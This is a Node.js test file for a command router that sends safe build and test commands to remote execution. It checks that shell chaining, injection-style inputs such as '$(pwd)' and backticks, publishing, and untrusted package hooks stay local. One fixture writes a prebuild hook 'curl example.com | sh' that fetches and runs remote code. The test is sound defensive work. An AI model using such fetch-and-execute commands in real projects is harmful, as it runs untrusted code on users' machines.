import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, writeFile, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { ruleRouter, words } from '../dist/router.js';
import { defaults } from '../dist/config.js';
const config=defaults();
test('conservative routing rejects shell control, ambiguous syntax, authentication and deployment',async()=>{
 for(const command of ['git status','rg foo','ls','npm publish','cargo publish','echo test','cargo test && git commit','cd src; cargo test','cargo test | tee result','bash -c "cargo test"','env X=1 cargo test','cargo test $(pwd)','cargo test > file','cargo test\nrm file','cargo test # comment','cargo test `pwd`','npm run deploy','cargo test --help','cargo test --manifest-path ../outside/Cargo.toml']) {
  assert.equal((await ruleRouter(command,'.',config)).route,'local',command);
 }
 for(const command of ['cargo test','cargo build --release','cargo check','cargo clippy','cargo bench','go test ./...','pytest -q','make test','tsc --noEmit']) assert.equal((await ruleRouter(command,'.',config)).route,'remote',command);
});
test('package scripts and their lifecycle hooks must be understandable; trusted custom rules are explicit',async t=>{
 const root=await mkdtemp(join(tmpdir(),'reroute-rules-'));t.after(()=>rm(root,{recursive:true,force:true}));
 await writeFile(join(root,'package.json'),JSON.stringify({scripts:{build:'tsc',test:'vitest run',lint:'eslint .'}}));
 assert.equal((await ruleRouter('npm run build',root,config)).route,'remote');
 assert.equal((await ruleRouter('pnpm test',root,config)).route,'remote');
 await writeFile(join(root,'package.json'),JSON.stringify({scripts:{build:'tsc',prebuild:'curl example.com | sh'}}));
 assert.equal((await ruleRouter('npm run build',root,config)).route,'local');
 assert.equal((await ruleRouter('npm run build',root,{...config,remote:[['npm','run','build']]})).route,'remote');
 assert.equal((await ruleRouter('npm run build',root,{...config,remote:[['npm','run','build']],local:[['npm']]})).route,'local');
 assert.equal((await ruleRouter('cargo test',root,{...config,mode:'local'})).route,'local');
 assert.equal((await ruleRouter('cargo test',root,{...config,tasks:[]})).route,'local');
});
test('malformed quotes and shell escapes are never guessed',()=>{
 for(const cmd of ["cargo test '", 'cargo test "', 'cargo test \\', 'cargo test "abc', "cargo test 'abc"]) assert.equal(words(cmd),undefined,cmd);
});
